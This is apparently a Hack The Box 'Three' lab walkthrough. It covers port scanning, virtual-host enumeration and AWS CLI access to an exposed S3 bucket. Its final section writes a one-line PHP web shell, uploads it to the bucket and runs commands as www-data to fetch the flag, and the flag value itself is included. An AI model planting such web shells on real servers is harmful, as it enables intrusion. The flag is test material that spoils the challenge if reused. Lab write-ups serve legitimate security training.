Connect the VPN, spawn the VM.<br>
10.129.207.118


### TASK 1

How many TCP ports are open?



```
# nmap -sC -sS -sV 10.129.207.118 -n -Pn -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 04:13 EDT
Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.47% done; ETC: 04:20 (0:05:58 remaining)
Stats: 0:08:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 59.38% done; ETC: 04:27 (0:05:53 remaining)
Nmap scan report for 10.129.171.132
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 997.74 seconds
```

Answer: 2

### TASK 2

What is the domain of the email address provided in the "Contact" section of the website?

![[hackthebox/HTB-Three/Image1.png]]

Answer: thetoppers.htb

### TASK 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?

Answer: /etc/hosts

### TASK 4

Which sub-domain is discovered during further enumeration?

Edit the hosts files to include the domain
```
# cat /etc/hosts             
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.207.118  thetoppers.htb
```

```
# gobuster --help                                                                                  
Usage:
  gobuster [command]

Available Commands:
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode

Flags:
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -h, --help              help for gobuster
      --no-error          Don't display errors
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -p, --pattern string    File containing replacement patterns
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist

Use "gobuster [command] --help" for more information about a command.
```

```
# gobuster vhost -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u http://thetoppers.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/amass/subdomains-top1mil-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/06 15:15:37 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 404) [Size: 21]
Found: gc._msdcs.thetoppers.htb (Status: 400) [Size: 306]
Found: m..thetoppers.htb (Status: 400) [Size: 306]       
Found: ns2.cl.bellsouth.net..thetoppers.htb (Status: 400) [Size: 306]
Found: ns1.viviotech.net..thetoppers.htb (Status: 400) [Size: 306]   
Found: ns2.viviotech.net..thetoppers.htb (Status: 400) [Size: 306]   
Found: ns3.cl.bellsouth.net..thetoppers.htb (Status: 400) [Size: 306]
Found: ferrari.fortwayne.com..thetoppers.htb (Status: 400) [Size: 306]
Found: jordan.fortwayne.com..thetoppers.htb (Status: 400) [Size: 306] 
Found: quatro.oweb.com..thetoppers.htb (Status: 400) [Size: 306]      
===============================================================
2022/10/06 15:17:44 Finished
===============================================================
```

Answer: s3.thetoppers.htb

###  TASK 5

Which service is running on the discovered sub-domain?

![[hackthebox/HTB-Three/Image2.png]]

Answer: amazon s3


### TASK 6

Which command line utility can be used to interact with the service running on the discovered sub-domain?

Answer: awscli

### TASK 7

Which command is used to set up the AWS CLI installation?

https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html

```
# curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

https://docs.aws.amazon.com/cli/latest/userguide/getting-started-quickstart.html

```
# aws configure 
AWS Access Key ID [None]: adsf
AWS Secret Access Key [None]: adsf
Default region name [None]: asdf
Default output format [None]: asdf
```

Answer: aws configure

### TASK 8

What is the command used by the above utility to list all of the S3 buckets?

Edit the hosts files as per task 4 to include s3.thetoppers.htb for the same IP address as the target machine.

https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html

```
# aws --endpoint http://s3.thetoppers.htb s3 ls
2022-10-06 15:01:35 thetoppers.htb
```

Answer: aws s3 ls

### TASK 9

This server is configured to run files written in what web scripting language?

```
# aws --endpoint http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2022-10-06 15:01:35          0 .htaccess
2022-10-06 15:01:36      11952 index.php
```

Answer: php

### SUBMIT FLAG

Submit root flag

Create a shell.php with the following contents:
```
<?php
  system($_GET['cmd']);
?>
```

Upload it to the s3 bucket

```
# aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb   
upload: ./shell.php to s3://thetoppers.htb/shell.php             
```

Navigate to ```thetoppers.htb/shell.php?=whoami``` and verify www-data is running the web application.

use cat and ls to navigate the file system looking for the flag.

![[Image3.png]]

Answer: a980d99281a28d638ac68b9bf9453c2b